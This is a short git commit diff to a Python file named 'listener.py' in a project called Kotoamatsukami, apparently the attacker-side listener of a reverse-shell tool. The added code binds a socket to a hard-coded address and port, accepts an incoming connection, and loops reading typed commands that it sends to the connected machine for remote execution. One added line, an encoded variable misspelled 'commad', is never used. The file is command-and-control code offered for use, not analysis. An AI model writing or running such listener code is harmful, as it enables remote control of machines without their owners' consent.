884dcbc496b2b5bb6d546c59054bd619a20e5b21
RockBlet <belyakove31@gmail.com>
2022-12-23 06:12:11 +0300

    encode

--- Kotoamatsukami/listener.py
+++ Kotoamatsukami/listener.py
@@ -7,7 +7,7 @@ class Listener:
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         listener.bind((ip, port))
-        listener.listen(__backlog=4)
+        listener.listen(4)
 
         print("[+] Waiting for incoming connection")
         self.connection, address = listener.accept()
@@ -21,6 +21,15 @@ class Listener:
     def run(self):
         while True:
             command = str(input(">> "))
+            commad = command.encode("utf-8")
             result = self.execute_remotely(command)
             print(result)
 
+
+if __name__ == "__main__":
+
+    ip = "192.168.20.158"
+    port = 8080
+
+    listener = Listener(ip, port)
+    listener.run()
